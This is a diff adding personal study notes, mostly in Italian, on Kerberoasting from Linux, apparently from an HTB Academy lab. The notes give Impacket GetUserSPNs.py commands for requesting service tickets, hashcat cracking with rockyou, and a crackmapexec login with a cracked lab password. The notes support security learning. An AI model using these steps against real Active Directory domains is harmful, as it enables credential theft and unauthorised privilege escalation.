@@ -769,3 +769,74 @@ The above example sets the first criteria that the object must be a user and com
 This would search for any user object that does NOT have the Password Can't Change attribute set. When thinking about users, groups, and other objects in AD, our ability to search with LDAP queries is pretty extensive.
 
 A lot can be done with UAC filters, operators, and attribute matching with OID rules. For now, this general explanation should be sufficient to cover this module. For more information and a deeper dive into using this type of filter searching, see the Active Directory LDAP module.
+
+# Kerbreroasting from Linux
+
+Il kerberoastin e' una tecnica di lateral movement/privilege escalation in un dominio AD.
+
+L' attacco targetta SPN (Service Principal Names) accounts. SPNs sono identificatori univoci che kerberos usa per mappare un' istanza di un servizio ad un account servizio.
+
+I domain account sono spesso usati per runnare servizi ed evitare limitazioni di autenticazione alla rete . Questi account tipicamente sono del tipo **NT AUTHORITY\LOCAL SERVICE**.
+
+Ogni domain user puo' richiedere a Kerberos un ticket per ogni account di servizio.
+Questo e' anche possibile attraverso forest trusts se l'autenticazione permette di attraversare i confini.
+
+Per fare un Kerberoasting ha bisogno di una password di un account in cleartext o NTLM hash, una shell nel contesto del domain user account o un SYSTEM level access in un host del dominio.
+
+Spesso gli account che runnano servizi sono amministratori locali.
+
+Prendere un kerberos ticket per un SPN non permette direttamente di eseguire comandi con quell' account, Il ticket inotlra e' criptato con l' hash NTLM del service account, quindi la password in cleartext si puo' ottenere anche sfruttando sta roba.
+
+Spesso per semplicita' i service account sono configurati con password deboli o riusate, spesso la password e' il nome del servizio.
+
+Se riusciamo ad attaccare un account del server SQL probabilmente ci ritroviamo come locala dmin in molti altri server. 
+
+
+## Kerberoasting - Performing the Attack
+
+Depending on your position in a network, this attack can be performed in multiple ways:
+
+    From a non-domain joined Linux host using valid domain user credentials.
+    From a domain-joined Linux host as root after retrieving the keytab file.
+    From a domain-joined Windows host authenticated as a domain user.
+    From a domain-joined Windows host with a shell in the context of a domain account.
+    As SYSTEM on a domain-joined Windows host.
+    From a non-domain joined Windows host using runas /netonly.
+
+Several tools can be utilized to perform the attack:
+
+    Impacket’s GetUserSPNs.py from a non-domain joined Linux host.
+    A combination of the built-in setspn.exe Windows binary, PowerShell, and Mimikatz.
+    From Windows, utilizing tools such as PowerView, Rubeus, and other PowerShell scripts.
+
+## Efficacia
+Spesso possiamo provare a craccare molti ticket pero' non e' detto che siano di utenti privilegiati
+
+
+## Kerberoasting con GetUserSPN.py
+
+RICORDIAMO PRREQUISITO DI BERBEROASTING E' O DOMAIN USER CREDENTIALS(CLEARTEXT PASSWORD O SOLO NTLM HASH SE USIAMO IMPACKET) SHELL NEL CONTESTO DEL DOMAIN USER O ACCOUNT TIPO SISTEM. INOLTRE DBBIAMO SAPERE CHI E' L'HOST DEL DOMAIN CONTROLLER COSI' LO POSSIAMO INTERROGARE.
+
+### Installiamo impacket tool
+
+`python3 -m pip install impacket`
+
+### Listing SPN Accounts 
+`j4k1dibe@htb[/htb]$ GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend`
+
+### Richiediamo tutti i TGS tickets
+`j4k1dibe@htb[/htb]$ GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request`
+
+### Richiediamo un solo TGS per un utente specifico (sqldev)
+`j4k1dibe@htb[/htb]$ GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev`
+
+`j4k1dibe@htb[/htb]$ GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev -outputfile sqldev_tgs`, salviamo in un output file
+
+
+### Crackiamo offline con hashcat
+`j4k1dibe@htb[/htb]$ hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt `
+
+
+### Proviamo autenticazione col domain controller con la password craccata
+
+`j4k1dibe@htb[/htb]$ sudo crackmapexec smb 172.16.5.5 -u sqldev -p database!` 
